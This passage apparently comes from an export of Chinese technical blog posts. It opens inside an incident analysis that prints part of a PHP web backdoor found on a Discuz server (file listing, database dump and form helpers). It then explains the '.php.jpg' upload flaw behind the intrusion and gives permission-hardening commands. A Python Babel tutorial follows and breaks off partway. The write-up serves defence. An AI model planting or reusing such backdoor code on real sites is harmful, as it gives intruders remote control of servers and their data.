#2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['dirlink']=$dir;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['server_link']=$f;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $j++;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   closedir($dh);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   clearstatcache();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $filedata;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n\nfunction qy($sql) {<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   global $mysqllink;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //echo $sql.'&lt;br&gt;';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $res = $error = '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(!$res = @mysql_query($sql,$mysqllink)) {<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else if(is_resource($res)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return 1;<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return 2;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }<span style=\"color: #f99157; background-color: #515151;\">   </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return 0;\n}\n\nfunction q($sql) {<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   global $mysqllink;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return @mysql_query($sql,$mysqllink);\n}\n\nfunction fr($qy){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   mysql_free_result($qy);\n}\n\nfunction sizecount($fileSize) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $size = sprintf(\"%u\", $fileSize);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($size == 0) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return '0 Bytes' ;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $sizename = array(' Bytes', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB',<span style=\"text-decoration: underline;\"> ' YB');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizen<span style=\"text-decoration: underline;\">ame[$i];</span>\n}\n// &#22791;&#20221;&#25968;&#25454;&#24211;\nfunction sqldumptable($table, $fp=0) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   global $mysqllink;\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $tabledump = \"DROP TABLE IF EXISTS `$table`;\\n\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $res = q(\"SHOW CREATE TABLE $table\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $create = mysql_fetch_row($res);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $tabledump .= $create[1].\";\\n\\n\";\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($fp) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fwrite($fp,$tabledump);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo $tabledump;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $tabledump = '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $rows = q(\"SELECT * FROM $table\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while ($row = mysql_fetch_assoc($rows)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach($row as $k=&gt;$v) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $row[$k] = \"'\".@mysql_real_escape_string($v).\"'\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(\", \", $row).');<span style=\"text-decoration: underline;\">'.\"\\n\";</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($fp) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fwrite($fp,$tabledump);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo $tabledump;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fwrite($fp,\"\\n\\n\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fr($rows);\n}\n\nfunction p($str){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo $str.\"\\n\";\n}\n\nfunction tbhead() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\"&gt;');\n}\nfunction tbfoot(){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/table&gt;');\n}\n\nfunction makehide($name,$value=''){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;input id=\\\"$name\\\" type=\\\"hidden\\\" name=\\\"$name\\\" value=\\\"$value\\\" /&gt;\");\n}\n\nfunction makeinput($arg = array()){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $arg['size'] = $arg['size'] &gt; 0 ? \"size=\\\"$arg[size]\\\"\" : \"size=\\\"100\\\"\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $arg['extra'] = $arg['extra'] ? $arg['extra'] : '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$arg['type'] &amp;&amp; $arg['type'] = 'text';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $arg['title'] = $arg['title'] ? $arg['title'].'&lt;br /&gt;' : '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $arg['class'] = $arg['class'] ? $arg['class'] : 'input';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($arg['newline']) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;p&gt;$arg[title]&lt;input class=\\\"$arg[class]\\\" name=\\\"$arg[name]\\\" id=\\\"$<span style=\"text-decoration: underline;\">arg[name]\\\" value=\\\"$arg[value]\\\" type=\\\"$arg[type]\\\" $arg[size] $arg[extra] /&gt;&lt;/p&gt;\");</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"$arg[title]&lt;input class=\\\"$arg[class]\\\" name=\\\"$arg[name]\\\" id=\\\"$arg<span style=\"text-decoration: underline;\">[name]\\\" value=\\\"$arg[value]\\\" type=\\\"$arg[type]\\\" $arg[size] $arg[extra] /&gt;\");</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n\nfunction makeselect($arg = array()){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($arg['onchange']) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $onchange = 'onchange=\"'.$arg['onchange'].'\"';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $arg['title'] = $arg['title'] ? $arg['title'] : '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($arg['newline']) p('&lt;p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"$arg[title] &lt;select class=\\\"input\\\" id=\\\"$arg[name]\\\" name=\\\"$arg[name]\\\"<span style=\"text-decoration: underline;\"> $onchange&gt;\");</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (is_array($arg['option'])) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($arg['nokey']) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach ($arg['option'] as $value) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($arg['selected']==$value) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;option value=\\\"$value\\\" selected&gt;$value&lt;/option&gt;\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;option value=\\\"$value\\\"&gt;$value&lt;/option&gt;\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach ($arg['option'] as $key=&gt;$value) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($arg['selected']==$key) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;option value=\\\"$key\\\" selected&gt;$value&lt;/option&gt;\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;option value=\\\"$key\\\"&gt;$value&lt;/option&gt;\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;/select&gt;\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($arg['newline']) p('&lt;/p&gt;');\n}\nfunction formhead($arg = array()) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   global $self;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$arg['method'] &amp;&amp; $arg['method'] = 'post';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$arg['action'] &amp;&amp; $arg['action'] = $self;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $arg['target'] = $arg['target'] ? \"target=\\\"$arg[target]\\\"\" : '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$arg['name'] &amp;&amp; $arg['name'] = 'form1';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;form name=\\\"$arg[name]\\\" id=\\\"$arg[name]\\\" action=\\\"$arg[action]\\\" metho<span style=\"text-decoration: underline;\">d=\\\"$arg[method]\\\" $arg[target]&gt;\");</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($arg['title']) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h2&gt;'.$arg['title'].' &amp;raquo;&lt;/h2&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n\nfunction maketext($arg = array()){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$arg['cols'] &amp;&amp; $arg['cols'] = 100;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$arg['rows'] &amp;&amp; $arg['rows'] = 25;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $arg['title'] = $arg['title'] ? $arg['title'].'&lt;br /&gt;' : '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;p&gt;$arg[title]&lt;textarea class=\\\"area\\\" id=\\\"$arg[name]\\\" name=\\\"$arg[name<span style=\"text-decoration: underline;\">]\\\" cols=\\\"$arg[cols]\\\" rows=\\\"$arg[rows]\\\" $arg[extra]&gt;$arg[value]&lt;/textarea&gt;&lt;/p&gt;\");</span>\n}\n\nfunction formfooter($name = ''){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$name &amp;&amp; $name = 'submit';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;&lt;input class=\"bt\" name=\"'.$name.'\" id=\"'.$name.'\" type=\"submit\" value=<span style=\"text-decoration: underline;\">\"Submit\"&gt;&lt;/p&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/form&gt;');\n}\n\nfunction goback(){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   global $self, $nowpath;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;form action=\"'.$self.'\" method=\"post\"&gt;&lt;input type=\"hidden\" name=\"action\"<span style=\"text-decoration: underline;\"> value=\"file\" /&gt;&lt;input type=\"hidden\" name=\"dir\" value=\"'.$nowpath.'\" /&gt;&lt;p&gt;&lt;input class=\"bt\" type=\"submit\" value=\"Go back...\"&gt;&lt;/p&gt;&lt;/form&gt;');</span>\n}\n\nfunction formfoot(){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/form&gt;');\n}\n\nfunction encode_pass($pass) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $pass = md5('angel'.$pass);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $pass = md5($pass.'angel');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $pass = md5('angel'.$pass.'angel');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $pass;\n}\n\nfunction pr($s){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo \"&lt;pre&gt;\".print_r($s).'&lt;/pre&gt;';\n}\n\n?&gt;\n</pre>\n</div>\n\n<p>\n上面的脚本被恶意用户完成对系统的远程控制。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">问题根源</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<p>\n这次发现的恶意代码注入应该是之前的一次 <code>nginx</code> 和 <code>php</code> <a href=\"http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443\">安全漏洞</a> 引起，当时由 <code>WooYun.org</code> 汇报，原来已经被恶意用户种下了这些后门。\n</p>\n\n<p>\n这个漏洞简言之就是用户可以上传文件后缀为 <code>.php.jpg</code> 的文件，在外部访问时直接被当做 <code>php</code> 执行，罪魁祸首归结为以下三点：\n</p>\n\n<ul class=\"org-ul\">\n<li><code>php</code> 配置\n</li>\n\n<li><code>nginx</code> 配置\n</li>\n\n<li><code>discuz</code>\n\n<p>\n允许上传文件名指定后缀为 <code>.php.jpg</code>\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">加固措施</h2>\n<div class=\"outline-text-2\" id=\"text-6\">\n<ul class=\"org-ul\">\n<li>采用更严格的文件目录权限\n\n<ul class=\"org-ul\">\n<li>列出属主不应该为 <code>nobody</code> 的目录：\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">find . -type d  | xargs ls -lad | grep nobody | grep -v <span style=\"color: #66cccc;\">'/data'</span>\n</pre>\n</div>\n\n<p>\n除 <code>discuz</code> 要求为可写的目录（路径名包启/data）外，其它所有文件及目录属主都改为非 <code>nobody</code> 用户。\n</p>\n\n<p>\n需要注意的是 <code>source/plugin/</code> 下的所有目录需要为所有用户添加上可执行权限（特别是自已开发并上传解压的插件），否则访问插件时会出现以下错误提示：\n</p>\n\n<pre class=\"example\">\n         指定的插件模块文件(XXXXXXXXXX)不存在或存在语法错误，请检查是否已将插件完整上传\n</pre>\n</li>\n\n<li>列出属主不应该为 <code>nobody</code> 的文件：\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">find . -type f  | xargs ls -la | grep nobody | grep -v <span style=\"color: #66cccc;\">'/data'</span>\n</pre>\n</div>\n\n<p>\n除 <code>discuz</code> 要求为可写的文件（路径名包启/data）外，其它所有文件属主都改为非 <code>nobody</code> 用户。\n</p>\n</li>\n\n<li>列出 <code>nobody</code> 可写的文件\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">find . -type f ! -perm 0644  | xargs ls -la | grep -v <span style=\"color: #66cccc;\">'/data/'</span>\n</pre>\n</div>\n\n<p>\n收回非必要的写权限。\n</p>\n</li>\n</ul>\n</li>\n\n<li>确保上传目录中的 <code>php</code> 文件不会被当做 <code>php</code> 执行\n\n<ul class=\"org-ul\">\n<li>data/attachment\n</li>\n<li>uc_server/data/avatar\n</li>\n<li>uc_server/data/tmp\n</li>\n</ul>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "python应用国际化：Babel",
  "timestamp": "2014-03-09 19:54:00",
  "tags": [
    "python",
    "babel"
  ],
  "body": "<p>\n<a href=\"http://babel.pocoo.org/\">Babel</a> 是 <code>Python</code> 的一个国际化工具包，原本为<i>Edgewall.org</i>下的一个项目，现在已经转为由<i>pocoo.org</i>维护。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">统一管理 <code>Python</code> 虚拟环境</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S python-virtualenvwrapper\nmkdir $<span style=\"color: #ffcc66;\">HOME</span>/.virtualenvs\n<span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">'export WORKON_HOME=$HOME/.virtualenvs'</span> &gt;&gt; ~/.bashrc\n<span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">'source virtualenvwrapper.sh'</span> &gt;&gt; ~/.bashrc\n<span style=\"color: #cc99cc;\">source</span> ~/.bashrc\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">建立学习 <code>Babel</code> 专用虚拟环境</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mkvirtualenv --python=/usr/bin/python2 --no-site-packages LearnBabel\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">编译安装 <code>Babel</code></h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git clone https://github.com/mitsuhiko/babel.git\n<span style=\"color: #cc99cc;\">cd</span> babel\npip install pytz\npython setup.py import_cldr\npip install --editable .\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">常用信息国际化</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<pre class=\"example\">\n&gt;&gt;&gt; from babel import Locale\n&gt;&gt;&gt; locale = Locale('en', 'US')\n&gt;&gt;&gt; print locale.territories['CN']\nChina\n&gt;&gt;&gt; locale = Locale('zh')\n&gt;&gt;&gt; print locale.territories['CN']\n中国\n&gt;&gt;&gt; month_names = locale.months['format']['wide'].items()\n&gt;&gt;&gt; for idx, name in sorted(month_names):\n...   print name\n... \n一月\n二月\n三月\n四月\n五月\n六月\n七月\n八月\n九月\n十月\n十一月\n十二月\n&gt;&gt;&gt; from datetime import date\n&gt;&gt;&gt; from babel.dates import format_date\n&gt;&gt;&gt; today = date.today()\n&gt;&gt;&gt; print format_date(today, locale='zh')\n2014年3月9日\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">任意信息国际化</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<ul class=\"org-ul\">\n<li>创建python程序： <code>hello.py</code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\"><span style=\"color: #99cc99;\">import</span> gettext\ngettext.bindtextdomain(<span style=\"color: #66cccc;\">'messages'</span>, <span style=\"color: #66cccc;\">'./hello.i18n'</span>)\n<span style=\"color: #ffcc66;\">_</span> = gettext.gettext\n<span style=\"color: #99cc99;\">print</span> _(<span style=\"color: #66cccc;\">'Hello'</span>)\n</pre>\n</div>\n</li>\n\n<li>创建Babel配置文件： <code>hello.babel</code>\n\n<pre class=\"example\">\n[python: hello.py]\n</pre>\n</li>\n\n<li>准备翻译成中文\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mkdir hello.i18n\npybabel extract -F hello.babel . -o hello.i18n/messages.pot    <span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">&#20174;&#28304;&#20195;&#30721;&#20013;&#25552;&#21462;&#21487;&#32763;&#35793;&#30340;&#25991;&#26412;&#21040;P</span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">OT&#65288;PO&#27169;&#26495;&#65289;&#25991;&#20214;</span>\npybabel init -l zh_CN -d ./hello.i18n -i ./hello.i18n/messages.pot    <span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">&#23558;POT&#25991;&#26412;&#25335;&#36125;</span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">&#20986;&#19968;&#20221;&#25351;&#23450;&#35821;&#35328;&#30340;PO&#25991;&#20214;</span>\n</pre>\n</div>\n</li>\n\n<li>译成中文后的PO文件： <code>./hello.i18n/zh_CN/LC_MESSAGES/messages.po</code>\n\n<pre class=\"example\">\n# Chinese (Simplified, China) translations for PROJECT.\n# Copyright (C) 2014 ORGANIZATION\n# This file is distributed under the same license as the PROJECT project.\n# FIRST AUTHOR &lt;EMAIL@ADDRESS&gt;, 2014.\n#\n#, fuzzy\nmsgid \"\"\nmsgstr \"\"\n\"Project-Id-Version: PROJECT VERSION\\n\"\n\"Report-Msgid-Bugs-To: EMAIL@ADDRESS\\n\"\n\"POT-Creation-Date: 2014-03-09 19:08+0800\\n\"\n\"PO-Revision-Date: 2014-03-09 19:12+0800\\n\"\n\"Last-Translator: FULL NAME &lt;EMAIL@ADDRESS&gt;\\n\"\n\"Language-Team: zh_Hans_CN &lt;LL@li.org&gt;\\n\"\n\"Plural-Forms: nplurals=2; plural=(n != 1)\\n\"\n\"MIME-Version: 